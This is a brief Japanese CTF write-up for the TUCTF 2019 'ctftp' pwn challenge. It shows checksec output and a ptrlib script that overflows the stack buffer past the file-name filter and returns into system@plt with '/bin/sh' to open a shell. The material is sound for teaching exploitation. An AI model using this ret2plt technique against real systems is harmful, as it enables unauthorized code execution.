# [pwn 497pts] ctftp - TUCTF 2019
NX以外無効です。
```
$ checksec -f ctftp
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable  FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   92 Symbols     No       0               10      ctftp
```
ファイル名を入力してダウンロードできますが、ファイル名として使える文字は限られています。とはいえStack Overflowがあり、オーバーフローした部分はフィルターの対象にならないので問題無いです。
```python
from ptrlib import *

elf = ELF("./ctftp")
sock = Process("./ctftp")

payload = b'dummy'
payload += b'\x00' * (0x4c - len(payload))
payload += p32(elf.plt('system'))
payload += p32(0xdeadbeef)
payload += p32(elf.symbol('username'))

sock.sendafter(": ", "/bin/sh\n")
sock.sendlineafter("> ", "2")
sock.sendafter(": ", payload)
sock.recvline()

sock.interactive()
```

# 感想
簡単ですね。